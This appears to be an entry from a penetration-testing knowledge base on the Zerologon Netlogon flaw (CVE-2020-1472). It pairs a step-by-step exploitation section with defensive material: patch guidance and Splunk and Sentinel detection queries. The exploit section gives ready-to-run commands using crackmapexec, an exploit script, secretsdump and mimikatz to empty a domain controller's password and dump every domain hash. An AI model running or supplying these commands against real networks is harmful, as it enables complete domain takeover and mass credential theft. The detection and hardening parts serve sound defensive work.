name: Zerologon (CVE-2020-1472) - Netlogon Privilege Escalation
description: Zerologon exploits a flaw in the Netlogon protocol (MS-NRPC) where the initialization vector is set to all zeros. By sending Netlogon messages with a zero IV, an attacker can authenticate as the Domain Controller machine account and set its password to empty, enabling DCSync. One of the most critical AD vulnerabilities ever discovered.
notes:
=== CHECK IF VULNERABLE ===
  # Using crackmapexec:
  crackmapexec smb <dc_ip> -u "" -p "" -M zerologon
  # Using the check script:
  python3 zerologon_tester.py <dc_name> <dc_ip>

=== EXPLOIT ===
  # Step 1: Set DC password to empty
  python3 cve-2020-1472-exploit.py <dc_name> <dc_ip>

  # Step 2: DCSync with empty password
  secretsdump.py -no-pass -just-dc <domain>/<dc_name>$@<dc_ip>

  # Step 3: RESTORE the DC password (CRITICAL!)
  # Get the original machine account hash:
  secretsdump.py -hashes :<admin_nthash> <domain>/Administrator@<dc_ip>
  # Restore the password:
  python3 restorepassword.py <domain>/<dc_name>@<dc_name> -target-ip <dc_ip> -hexpass <original_hex>

=== WARNING ===
  # ZEROLOGON BREAKS THE DC if you dont restore the password!
  # The DC machine account password in AD will not match the
  # local copy, causing replication failures and domain issues.
  # ALWAYS restore the password after exploitation.

=== USING MIMIKATZ ===
  lsadump::zerologon /target:<dc_fqdn> /account:<dc_name>$ /exploit
  lsadump::dcsync /domain:<domain> /dc:<dc_fqdn> /user:Administrator /authuser:<dc_name>$ /authdomain:<domain> /authpassword:"" /authntlm

examples.label: Exploit and set DC password to empty

recommended.note: Certifried is another critical AD CVE for domain escalation.
DCSync after Zerologon to dump all domain hashes.

defense.why_it_works: The Netlogon protocol uses AES-CFB8 with a zero IV, allowing an attacker to guess the session key by sending authentication attempts with all-zero client credentials. After ~256 attempts, one will succeed.
defense.prerequisites: Network access to DC (port 135/445); unpatched DC (pre-August 2020 KB4571702).
defense.impact: Complete domain compromise; DCSync as the DC machine account; can break DC if not restored.
defense.detection: [MITRE T1068] Multiple failed Netlogon authentication attempts followed by success; DC machine account password change; DCSync activity.
defense.artifacts: Event 4742 (DC computer account changed); Event 5805 (Netlogon auth failure); massive Netlogon traffic.
defense.splunk_spl:
index=windows (EventCode=5805 OR (EventCode=4742 AND TargetUserName="*$" AND SubjectUserName="ANONYMOUS LOGON"))
| table _time, EventCode, TargetUserName, SubjectUserName
defense.sentinel_kql:
SecurityEvent
| where EventID == 5805 or (EventID == 4742 and SubjectUserName == "ANONYMOUS LOGON")
| project TimeGenerated, EventID, TargetUserName, SubjectUserName, IpAddress
defense.prevention: Apply KB4571702 (August 2020); enable Netlogon secure channel enforcement; monitor for Zerologon scanning.

detections.name: Zerologon (CVE-2020-1472) exploitation attempt
detections.logic:
SecurityEvent
| where EventID == 5805
| summarize FailCount=count() by SourceIP=IpAddress, TargetUserName, bin(TimeGenerated, 5m)
| where FailCount > 10
| project TimeGenerated, SourceIP, TargetUserName, FailCount
detections.false_positives: Legitimate Netlogon issues (very rare at this volume)
detections.tuning: Any burst of 5805 events (>10 in 5 minutes) from a single source should trigger critical alert
